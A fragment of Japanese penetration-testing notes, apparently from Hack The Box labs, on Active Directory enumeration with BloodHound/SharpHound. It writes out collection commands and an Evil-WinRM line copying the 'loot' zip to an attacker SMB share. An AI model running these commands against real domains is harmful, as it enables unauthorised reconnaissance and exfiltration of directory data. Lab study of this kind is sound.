...
-> 「s**o**meaccountname」じゃなくて「s**a**maccountname」に注意！
...
```
PS> Invoke-Bloodhound -CollectionMethod All -Domain xor.com -ZipFileName xorloot.zip

PS> .\SharpHound.exe -c all -d htb.local --zipfilename loot.zip

PS> .\SharpHound.exe -c all
```

-> users.jsonがNo dataだったら、`--nozip`のオプションつきでSharpHound.exeを実行してみよ
...
*Evil-WinRM* PS C:\Users\FSmith> copy 20211223114351_loot.zip \\10.10.14.3\kali\
```
